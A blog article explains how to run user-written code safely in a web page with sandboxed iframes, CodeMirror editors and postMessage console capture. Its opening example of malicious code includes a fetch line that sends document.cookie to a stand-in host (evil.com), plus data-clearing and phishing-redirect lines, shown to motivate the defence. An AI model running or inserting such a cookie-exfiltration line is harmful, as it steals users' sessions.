One of my goals for rendered_useful is to let people create interactive content. Not just read about code, but *run* it. Think CodePen, but integrated into articles and personal spaces.

The challenge? Running user code is dangerous. This article explains how to do it safely, and yes, **the playgrounds in this article are real**. Try them.

## The Problem

When you let users write and run code on your site, bad things can happen:

```javascript
// A malicious user might try:
document.cookie  // Steal authentication
fetch('https://evil.com/steal?data=' + document.cookie)
localStorage.clear()  // Destroy data
window.location = 'https://phishing-site.com'
```

If their code runs in your page context, they can do anything you can do. Game over.

## The Solution: Sandboxed iframes

The browser has a powerful security feature: the `sandbox` attribute on iframes. It creates an isolated environment where code can run without access to the parent page.

  initialCss={`body { font-family: system-ui; }

  color: white; 
  border: none; 
  border-radius: 6px;
  cursor: pointer;
  margin: 10px 0;
}

  margin-top: 10px; 
  padding: 10px; 
  background: #f3f4f6;

Try clicking the button above. The code tries to access `parent.document` but the sandbox blocks it. This is the foundation of safe code execution.

## How the Sandbox Works

Here's the key insight: the iframe's `sandbox` attribute restricts what code can do:

```html
<iframe
  srcDoc="...user code..."
  sandbox="allow-scripts"
/>
```

With `sandbox="allow-scripts"`:
- ✅ JavaScript can run
- ❌ Cannot access parent window
- ❌ Cannot access parent cookies
- ❌ Cannot navigate the parent
- ❌ Cannot access localStorage (by default)
- ❌ Different origin, even if same domain

<Callout type="info" title="The Origin Trick">
  A sandboxed iframe without `allow-same-origin` gets a unique, opaque origin. It's like running on a completely different website, even though it's embedded in your page.
</Callout>

## Building the Playground

The playground is a custom React component, not an external library. It combines three code editors with a live preview, all powered by a few key pieces:

### The Stack

- **CodeMirror 6** for syntax highlighting. It's modular, so we only import what we need: `@codemirror/lang-html`, `@codemirror/lang-css`, `@codemirror/lang-javascript`, and the `oneDark` theme. Adds about 150KB gzipped.
- **Sandboxed iframe** for safe code execution. The browser does all the heavy lifting. No server required.
- **postMessage API** for parent-child communication. The iframe sends console output back to the React component.

### How It Works

1. User edits code in CodeMirror editors
2. React combines HTML, CSS, and JS into a single HTML document string
3. That string goes into the iframe's `srcDoc` attribute
4. The iframe renders the preview in an isolated sandbox
5. Console methods in the iframe are intercepted and sent via `postMessage`
6. The parent component receives messages and displays them in the console panel

Each playground instance gets a unique ID, so multiple playgrounds on a page don't cross-contaminate their console output.

The whole component is about 300 lines of TypeScript. No build servers, no external services. Just React, CodeMirror, and native browser APIs.

## Capturing Console Output

One tricky part: `console.log` normally goes to the browser's dev tools, not our UI. We solve this by intercepting console methods:

## Security Considerations

Even with sandboxing, there are things to think about:

### What the Sandbox Blocks

| Attack | Blocked? | How |
|--------|----------|-----|
| Access parent DOM | ✅ | Different origin |
| Steal cookies | ✅ | Different origin |
| Redirect parent | ✅ | `sandbox` blocks navigation |
| Infinite loops | ⚠️ | Only freezes iframe, not parent |
| Memory bombs | ⚠️ | Browser will kill the tab eventually |
| Network requests | ✅ | Disabled by default (CSP) |

### Enabling Network Access

By default, playgrounds can't make network requests. No `fetch()`, no loading external images, nothing. This is enforced via Content Security Policy.

But sometimes you *need* network access. The `allowNetwork` prop enables it, but shows a clear warning:

<CodePlayground
  title="Wikipedia API Demo"
  allowNetwork
  initialHtml={`<h2>Web Security</h2>
<p id="extract">Click the button to fetch from Wikipedia...</p>
<button id="fetch-btn">Fetch Article</button>`}
  initialCss={`body { font-family: system-ui; padding: 10px; }
h2 { margin-top: 0; color: #1e3a5f; }
#extract {
  line-height: 1.6;
  color: #333;
}
button {
  padding: 10px 20px;
  background: #3b82f6;
  color: white;
  border: none;
  border-radius: 6px;
  cursor: pointer;
  margin-bottom: 15px;
}
button:hover { background: #2563eb; }
.loading { color: #666; font-style: italic; }`}
  initialJs={`document.getElementById('fetch-btn').onclick = async () => {
  const el = document.getElementById('extract');
  el.textContent = 'Loading...';
  el.className = 'loading';
  
  try {
    const res = await fetch(
      'https://en.wikipedia.org/api/rest_v1/page/summary/Web_security'
    );
    const data = await res.json();
    el.textContent = data.extract;
    el.className = '';
    console.log('Fetched:', data.title);
  } catch(e) {
    el.textContent = 'Error: ' + e.message;
    console.error(e);
  }
};`}
  height={420}
/>

Notice the amber warning banner at the top. This tells users the playground can make external requests. Important for transparency when embedding untrusted code.

### Adding More Restrictions

You can make the sandbox even stricter:

```html
<!-- Most restrictive - no JS at all -->
<iframe sandbox srcDoc="..."></iframe>

<!-- Allow scripts only -->
<iframe sandbox="allow-scripts" srcDoc="..."></iframe>

<!-- Allow scripts + forms -->
<iframe sandbox="allow-scripts allow-forms" srcDoc="..."></iframe>

<!-- Allow scripts + local storage (more dangerous) -->
<iframe sandbox="allow-scripts allow-same-origin" srcDoc="..."></iframe>
```

<Callout type="warning" title="Careful with allow-same-origin">
  Adding `allow-same-origin` to a sandbox lets the iframe access `localStorage` and `sessionStorage`, but it also weakens isolation. Only use it if you need storage and understand the risks.
</Callout>

## What's Next

The playground works great for HTML/CSS/JS, but there's room to grow:

- **Python support** via Pyodide (~10MB WebAssembly runtime)
- **TypeScript** with in-browser transpilation
- **External libraries** loaded from CDN
- **Save and share** with unique URLs

The foundation is solid. Sandboxed iframes give us safe code execution, CodeMirror gives us a real editor experience, and `postMessage` handles communication. Adding new features is just building on top.
